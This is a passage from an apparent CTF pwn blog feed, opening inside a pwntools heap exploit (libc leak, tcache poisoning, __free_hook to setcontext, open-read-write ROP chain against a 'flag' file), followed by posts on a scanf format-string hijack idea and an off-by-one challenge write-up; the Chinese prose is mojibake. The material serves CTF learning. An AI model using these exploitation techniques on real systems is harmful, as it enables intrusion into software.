class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">rdi2rdx=lb+<span class="number">0x000000000014b760</span></span><br><span class="line">setcontext=lb+<span class="number">0x5306D</span></span><br><span class="line">ret=lb+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi=lb+<span class="number">0x000000000002858f</span></span><br><span class="line">pop_rsi=lb+<span class="number">0x000000000002ac3f</span></span><br><span class="line">pop_rdx_r12=lb+<span class="number">0x0000000000114161</span></span><br><span class="line">pop_rax=lb+<span class="number">0x0000000000045580</span></span><br><span class="line">syscall=lb+<span class="number">0x00108D55</span></span><br><span class="line">read=lb+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=lb+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">heap=key*<span class="number">0x1000</span>+<span class="number">0x1f0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(rdi2rdx))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(heap))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">1</span>)*<span class="number">15</span>+p64(heap+<span class="number">0xc0</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap+<span class="number">0x10</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap+<span class="number">0x28</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(setcontext))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h2><h3 id="without-look"><a href="#without-look" class="headerlink" title="without_look"></a>without_look</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16387344.html">house of apple  by Lynne</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤å¥ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
    <category term="house_of_botcake" scheme="http://example.com/tags/house-of-botcake/"/>
    
  </entry>
  
  <entry>
    <title>scanf_attackerï¼Ÿ</title>
    <link href="http://example.com/2022/09/02/scanf-hijacker/"/>
    <id>http://example.com/2022/09/02/scanf-hijacker/</id>
    <published>2022-09-02T01:55:51.000Z</published>
    <updated>2023-01-18T11:51:32.893Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€åˆ‡éƒ½æºäºæŸä¸ªä¸­åˆçš„çªå‘å¥‡æƒ³~</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png" style="zoom:80%;" /><span id="more"></span><h2 id="æƒ³æ³•"><a href="#æƒ³æ³•" class="headerlink" title="æƒ³æ³•"></a>æƒ³æ³•</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨è¾ƒä½çš„<code>libc</code>ç‰ˆæœ¬ï¼ˆ2.34ä¹‹å‰ï¼‰ä¸‹è¿›è¡Œ<code>orw</code>åˆ©ç”¨ä¸€èˆ¬æ˜¯æŠŠ<code>__free_hook</code>åŠ«æŒä¸º<code>setcontext</code>è¿›è¡Œæ ˆè¿ç§»ï¼ˆç°åœ¨è¿˜éœ€è¦è·³æ¿<code>gadget</code>å®Œæˆ<code>rdx</code>åˆ°<code>rdi</code>çš„è½¬å˜ï¼‰ï¼Œå †çš„å„é¡¹å¸ƒå±€å¯¹äºæˆ‘è¿™ä¸ªæƒ³å¯„å°±å¯„çš„èœé¸Ÿæ¥è¯´çœŸæ˜¯å¿ƒåŠ›æ†”æ‚´ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128154/12/29279/36057/63116848Ea2f34b05/b991a211c9e5b641.jpg" style="zoom: 33%;" /><p>è½¬å¿µä¸€æƒ³<code>free(buf)</code>ä¸­çš„<code>buf</code>æ˜¯äººä¸ºå¯æ§çš„ï¼Œ<code>free</code>ä¹Ÿå¯ä»¥ç”±<code>__free_hook</code>è¢«åŠ«æŒä¸ºæŸä¸ªå‡½æ•°ã€‚åˆšå¥½å½“æ—¶å›½èµ›å‡ºé¢˜å‡ºçš„å°±æ˜¯æœ‰å…³æ ¼å¼åŒ–å­—ç¬¦ä¸²<code>printf</code>å’Œ<code>scanf</code>çš„æ¼æ´åˆ©ç”¨ï¼Œå°±æœ‰äº†è¿™æ ·çš„æƒ³æ³•â€”â€”<code>free(buf)</code>===&gt;<code>scanf(buf)</code>ï¼Œå…¶ä¸­<code>buf</code>å †å—ä¸­å­˜æ”¾ç€<code>%n$s</code>æ¥å¯¹å‡†<code>rbp</code>é“¾åœ¨å‡½æ•°è¿”å›åœ°å€å¤„ç›´æ¥æ„é€ <code>orw</code>ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/47026/25/21037/41527/63116b98Eb9f9e80a/f3f24576b5844d4a.jpg" style="zoom: 25%;" /><h2 id="scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>åˆ©ç”¨<code>scanf(%n$s)</code>å¯ä»¥å¯¹åç§»ä¸º<code>n</code>çš„æ ˆä¸Š<strong>æŒ‡é’ˆ</strong>æŒ‡å‘å¤„è¿›è¡Œ<strong>ä»»æ„é•¿åº¦</strong>çš„è¾“å…¥ã€‚å¸¸è§åˆ©ç”¨æ‰‹æ³•æœ‰ï¼š</p><ol><li>æ ˆä¸Šè‹¥æ®‹ç•™<code>IO</code>æŒ‡é’ˆå¯è¿›è¡Œ<code>IO_ATTACK</code>æ³„éœ²<code>libc</code></li><li>åˆ©ç”¨<code>rbp</code>é“¾æ„é€ <code>rop</code>ï¼Œç›´æ¥é¿å¼€äº†<code>rbp</code>é“¾å‰çš„<code>canary</code></li></ol><h2 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h2><p>äºæ˜¯å…´è‡´å‹ƒå‹ƒåœ°è·‘å»ç”¨<a href="https://anza2001.github.io/2022/08/14/off-by-one/">ä¸Šæ¬¡åˆšå¤ç›˜è¿‡çš„é¢˜ç›®</a>è¿›è¡Œè¯•éªŒï¼š</p><p>ä¸‹å›¾ä¸ºå·²åŠ«æŒ<code>__free_hook</code>ä¸º<code>scanf</code>ï¼Œæ­£åœ¨å°è¯•æ‰§è¡Œ<code>scanf(&#39;%8$s&#39;)</code>æ“ä½œï¼ˆ8ä¸º<code>rbp</code>é“¾çš„åç§»ï¼‰ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/192749/27/27723/89623/63117202E1841821f/2f6f248266f3fff7.png" style="zoom:80%;" /><p>é€äº›åƒåœ¾æ•°æ®è¿‡å»ï¼Œçœ‹ä¸€ä¸‹æ ˆçš„å˜åŒ–ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/215319/40/20778/119453/631173b3Ea84ff058/050099a11809f7d9.png" style="zoom:80%;" /><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸåˆ©ç”¨<code>rbp</code>é“¾å°†<code>main</code>å‡½æ•°æ ˆçš„è¿”å›åœ°å€ç»™è¦†ç›–ä¸ºäº†<code>anzaanza</code>ï¼ŒåŠ ä¸Š<code>scanf</code>ä¹Ÿä¸ä¼šè¢«<code>\x00</code>æˆªæ–­ï¼Œæ‰€ä»¥ç›´æ¥æ„é€ <code>orw</code>å¹¶ééš¾äº‹ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><ol><li><p>çœå»äº†å¯¹å †å—çš„å¸ƒå±€æ“ä½œä»¥åŠå¯»æ‰¾<code>rdx</code>å’Œ<code>rdi</code>è½¬å˜çš„<code>gadget</code>ï¼Œç®€åŒ–ä¸ºåªéœ€è¦çˆ†ç ´å‡ºå›ºå®šåç§»å³å¯ã€‚</p></li><li><p>ä¸Šæ¬¡å¤ç›˜æ—¶æ„Ÿè§‰<code>setcontext</code>å’Œ<code>orw</code>é“¾éœ€è¦åœ¨ä¸€ä¸ªè¾ƒå¤§çš„å †å—ä¸­è¿›è¡Œå¸ƒå±€ï¼Œå¦‚æœæ‰€ç»™å †å—è¾ƒå°çš„è¯ï¼Œå¤§æ¦‚ä¼šæé«˜åˆ©ç”¨çš„å¤æ‚ç¨‹åº¦ï¼ˆç¬¬ä¸€æ¬¡åˆ©ç”¨<code>setcontext</code>è§£é¢˜ï¼Œç»éªŒä¸è¶³ï¼Œå¯èƒ½æ˜¯æ‹™è§ï¼‰ã€‚è€Œ<code>scanf</code>å¯è¾“å…¥ä¸é™é•¿ï¼Œå¯¹å‚æ•°å †å—<code>buf</code>çš„å¤§å°ä¹Ÿä¸åšé™åˆ¶ã€‚</p></li><li><p>å¦‚æœé¢˜ç›®å…è®¸ï¼Œåˆ™å¯ä¸æ–­ç”³è¯·ã€é‡Šæ”¾ï¼Ÿç›¸å½“äºæ— é™æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆä¸è®ºåŠ«æŒä¸º<code>scanf</code>è¿˜æ˜¯<code>printf</code>ï¼‰ï¼Œå¯ä»¥åœ¨æ ˆä¸Šæ„é€ æƒ³è¦çš„åœ°å€ï¼Œç„¶åå¯¹å…¶æŒ‡å‘å¤„è¿›è¡Œä¿®æ”¹ç­‰æ“ä½œï¼Ÿ</p></li></ol><h3 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><ol><li>è¯•éªŒè¿‡ç¨‹ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨<code>delete</code>åŠŸèƒ½å‡½æ•°ä¸­åˆ©ç”¨<code>scanf</code>æ ¼å¼åŒ–æ¼æ´åˆ©ç”¨åªèƒ½ä¿®æ”¹åˆ°å…¶<strong>çˆ¶å‡½æ•°</strong>å³<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œè®¸å¤šé¢˜ç›®éƒ½æ˜¯ç›´æ¥<code>exit</code>é€€å‡ºäº†ï¼Œä¸ç»™<code>main</code>å‡½æ•°è¿”å›çš„æœºä¼šã€‚</li><li>ä¼šè¢«<code>\x0a</code>æˆªæ–­ï¼Œå¯¹<code>rop</code>é“¾æœ‰è¦æ±‚ã€‚</li><li>å¤§æ¦‚æ›´é€‚ç”¨äº<code>orw</code>ï¼Œæ¯•ç«Ÿä¸å¼€æ²™ç®±çš„è¯ç›´æ¥æ„é€ <code>system(&#39;/bin/sh&#39;)</code>å°±å¥½ã€‚</li></ol><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p><code>scanf(buf)</code>å’Œ<code>system(buf)</code>éƒ½æ˜¯æ§åˆ¶å‡½æ•°å’Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œåè€…è¢«<code>sandbox</code>ä¹‹åï¼Œå‰è€…è¿˜æœ‰ç”¨æ­¦ä¹‹åœ°ï¼ˆé™¤é<code>orw</code>ç™½åå•ï¼‰ã€‚ä¸çŸ¥èƒ½å¦é…åˆ<code>io_file</code>ä¹‹ç±»çš„åˆ©ç”¨æ‰‹æ³•ï¼Œä»¥åŠæ­é…èµ·æ¥æ˜¯å¦æ¯”åŸè§£æ³•æ›´æ–¹ä¾¿ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸€åˆ‡éƒ½æºäºæŸä¸ªä¸­åˆçš„çªå‘å¥‡æƒ³~&lt;/p&gt;
&lt;img src=&quot;https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png&quot; style=&quot;zoom:80%;&quot; /&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://example.com/2022/08/14/off-by-one/"/>
    <id>http://example.com/2022/08/14/off-by-one/</id>
    <published>2022-08-14T01:07:26.000Z</published>
    <updated>2023-02-01T14:32:42.273Z</updated>
    
    <content type="html"><![CDATA[<p>èµ›å‰å¤ç›˜ä¸€é“<code>libc2.31</code>çš„<code>off-by-one</code>æ¼æ´åˆ©ç”¨çš„é¢˜ç›®ã€‚</p><span id="more"></span><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>ç‰¹æ®Šçš„å †æº¢å‡ºæ¼æ´ï¼Œåªæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œä»è€Œå½±å“ä¸‹ä¸€ä¸ªå †å—çš„å¤´éƒ¨æ§åˆ¶ä¿¡æ¯ï¼Œå³å †å—çš„<code>size</code>ä½ï¼Œåˆ©ç”¨æ€è·¯å¾€å¾€æ˜¯<strong>æ”¹å¤§</strong>ä¸‹ä¸€ä¸ªå †å—çš„<code>size</code>ä½ï¼Œä»è€Œé€ æˆ<strong>å †å—é‡å </strong>(overlapping)ã€‚</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>å°†ä¸‹ä¸€ä¸ªå †å—æ”¹å¤§(ä¸€èˆ¬æ”¹æˆ<strong>unsortedbin</strong>çš„å¤§å°)åè¿›è¡Œ<strong>é‡Šæ”¾</strong>ï¼Œåˆ©ç”¨<code>unsortedbin</code>ä¸­å †å—å¯åˆ‡å‰²çš„æ€§è´¨ï¼Œé€ æˆå †å—é‡å ï¼ŒåŒæ—¶å¯ä»¥æ³„éœ²å‡º<code>main_arena+96</code>ã€‚å‚è€ƒå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/9162/38/19492/69695/62f87050E2853f706/edc2658491d52f8a.png"></p><h3 id="Gadgetï¼šsetcontext"><a href="#Gadgetï¼šsetcontext" class="headerlink" title="Gadgetï¼šsetcontext"></a>Gadgetï¼šsetcontext</h3><p>é¦–å…ˆæ¥çœ‹ä¸‹<code>libc-2.27.so</code>ä¸­çš„<code>setcontext</code>ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/180383/9/27781/74057/62f87b1dE171bf553/952ab3795b63fd6b.png" style="zoom:80%;" /><p>åªè¦æˆ‘ä»¬æ§åˆ¶ä½<code>rdi</code>å¯„å­˜å™¨ä¸”ä¿è¯<code>rdi+0A0</code>å’Œ<code>rdi+0A8</code>å¤„<strong>äººä¸ºå¯æ§</strong>ï¼Œä¾¿èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚åœ¨<code>rdi+0A8</code>ç”¨<code>ret</code>æŒ‡ä»¤è¿›è¡Œè¦†ç›–ï¼Œ<code>rdi+0A0</code>å¤„æ„é€ <code>ROP</code>é“¾ã€‚è€Œæˆ‘ä»¬é€šå¸¸å°†<code>__free_hook</code>åŠ«æŒä¸º<code>setcontext+53</code>ï¼Œè€Œ<code>free(heap_ptr)</code>å‰ä¼šå°†<code>rdi</code>å†™å…¥<code>heap_ptr</code>ï¼Œå› æ­¤<code>rdi</code>ä¹Ÿå¯æ§ã€‚</p><p>å†æ¥çœ‹ä¸‹<code>libc-2.31.so</code>ä¸­çš„<code>setcontext</code>ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/27026/15/19442/63240/62f87f68E2355543e/3e7fd59d3eb7948a.png" style="zoom:80%;" /><p>æˆ‘ä»¬å‘ç°å¯„å­˜å™¨ç”±<code>rdi</code>æ”¹ä¸ºäº†<code>rdx</code>ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¦ä¸€ä¸ª<code>gadget</code>ä½œä¸ºè·³æ¿ï¼Œå¦‚ä¸‹ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/164191/21/29805/50170/62f8818aE389bea14/7a9e50a788d86bc3.png" style="zoom:80%;" /><h2 id="èµ›é¢˜è¯¦è§£"><a href="#èµ›é¢˜è¯¦è§£" class="headerlink" title="èµ›é¢˜è¯¦è§£"></a>èµ›é¢˜è¯¦è§£</h2><p>èµ›é¢˜å‡ºè‡ªç¬¬äºŒå±Šå¹¿ä¸œå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›â€”â€”midpwnã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/pwnpwnpwn/Libc2.31Training/midpwn$ checksec orz</span><br><span class="line">[*] &#x27;/home/fuzz/pwnpwnpwn/Libc2.31Training/midpwn/orz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="åŸºæœ¬åŠŸèƒ½æ¨¡å—"><a href="#åŸºæœ¬åŠŸèƒ½æ¨¡å—" class="headerlink" title="åŸºæœ¬åŠŸèƒ½æ¨¡å—"></a>åŸºæœ¬åŠŸèƒ½æ¨¡å—</h3><p>å…¸å‹çš„èœå•é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add new note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delte a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit        .&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choose which one?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>add</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *heap; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= size0x20 )<span class="comment">//å †å—ä¸Šé™ä¸º0x20</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = size0x20;</span><br><span class="line">      <span class="keyword">if</span> ( i == size0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no space left.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heap_ptr + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input note size : &quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x28</span> &amp;&amp; size != <span class="number">0xB0</span> )<span class="comment">//åªå…è®¸ç”³è¯·0x28å’Œ0xb0å¤§å°çš„å †å—</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your size is too small or too big.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( heap &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;heap_ptr + i) = heap;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your note.&quot;</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, *(&amp;heap_ptr + i), size);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>edit</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input new note.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//è¯»å…¥size+1ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>show</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span 